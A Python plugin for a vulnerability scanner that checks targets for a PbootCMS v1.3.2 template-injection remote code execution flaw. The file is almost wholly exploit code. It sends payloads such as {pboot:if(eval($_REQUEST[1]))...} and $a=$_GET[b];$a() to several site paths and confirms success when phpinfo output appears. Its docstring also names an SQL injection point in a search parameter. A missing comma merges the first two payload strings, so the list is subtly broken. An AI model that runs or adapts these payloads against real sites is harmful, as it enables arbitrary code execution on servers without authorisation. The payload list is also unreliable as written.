#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from aiohttp import FormData
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    '''
    PbootCMS v1.3.2命令执行
    另外还有 注入： PbootCMS/index.php/Search/index?keyword=pboot&you=gay  注入点在you，搜索型注入
    '''

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB


    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, ['./PbootCMS/', './']):
                    if path[-1] == '/':
                        for poc in [
                            "index.php/index/index?keyword={pboot:if(eval($_REQUEST[1]));//)})}}{/pboot:if}&1=phpinfo();"
                            "index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                            "index.php/Content/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                            "index.php/List/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                            "index.php/About/2?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo",
                            "index.php/Search/index?keyword={pboot:if(1)$a=$_GET[title];$a();//)})}}{/pboot:if}&title=phpinfo"
                        ]:
                            url = path + poc
                            async with session.get(url=url) as res:
                                if res !=None:
                                    text = await res.text()
                                    if "php.ini" in text:
                                        yield url
                                        return